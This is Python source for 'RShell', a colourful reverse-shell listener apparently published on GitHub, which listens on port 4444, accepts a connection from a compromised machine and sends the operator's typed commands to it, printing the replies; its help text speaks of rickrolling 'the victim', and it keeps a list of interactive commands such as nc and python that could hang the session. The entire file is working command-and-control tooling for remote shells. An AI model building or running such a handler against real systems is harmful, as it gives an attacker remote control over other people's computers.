import os
import sys
import socket
from pyfiglet import figlet_format
from rich.console import Console

console = Console()

class Server:

    @staticmethod
    def send_commands(s, rHost, rPort):

        custom_help = """
[green]rickroll[/green] : [red]rickrolls the victim[/red]
"""

        while True:
            try:
                noexec=["python", "nc", "python3", "@echo off", "if", "while"]

                prompt = f"[bold purple][[/bold purple ][bold green]{rHost}:{rPort}[bold purple]][/bold purple ]#[bold red]$[/bold red] "
                console.print(prompt, end="")
                command = input()

                if command.lower() == "quit" or command.lower() == "exit":
                    console.print(f"\n[bold yellow]Exit? Y/n[/bold yellow] ", end="")
                    sure=input()
                    if sure.lower() == "y" or sure.lower() == "s" or sure.lower() == "":
                        s.close()
                        console.print("Bye bye!!", style="bold green")
                        sys.exit()
                    else:
                        continue

                elif command == ":help":
                    console.print(custom_help)

                elif command in noexec:
                    console.print(f"[bold red]Dont execute commands that need an external input [bold blue](like [bold green]{command}[/bold green][bold blue])[bold red] they can break your shell[/bold red]")

                elif command == "cls":
                    try:
                        os.system("cls")
                    except:
                        console.print("\n[bold red]You're not on Windows[/bold red]")
                        continue

                elif command == "clear":
                    try:
                        os.system("clear")
                    except:
                        console.print("\n[bold red]Your're not on Linux[/bold red]")

                elif command == "":
                    pass

                else:
                    s.send(command.encode())
                    data = s.recv(4096)
                    if not data: break
                    console.print(f"[blue]{data.decode('cp850').rstrip()}[/blue]")

            except KeyboardInterrupt:
                console.print(f"\n[bold yellow]Exit? Y/n[/bold yellow] ", end="")
                sure=input()
                if sure.lower() == "y" or sure.lower() == "s" or sure.lower() == "":
                    s.close()
                    console.print("Bye bye!!", style="bold green")
                    sys.exit()
                else:
                    continue

    @staticmethod
    def display_startup_message():
        message = figlet_format("RShell")
        console.print(f"[bold green]{message}[/bold green]")
        console.print("[bold green]by Riccardo Zappitelli [bold red]https://github.com/Ricc4rdo0107[/bold red]\n")


    def server(self, host, port):
        self.display_startup_message()

        s = socket.socket()
        s.bind((host, port))
        s.listen()

        console.print("[bold green]Listening...[/bold green]")

        conn, raddr = s.accept()

        console.print(f"[bold red]Connection established with  [bold green][{raddr[0]}:{raddr[1]}][/bold green]\n")

        self.send_commands(conn, raddr[0], raddr[1])

Server().server("127.0.0.1", 4444)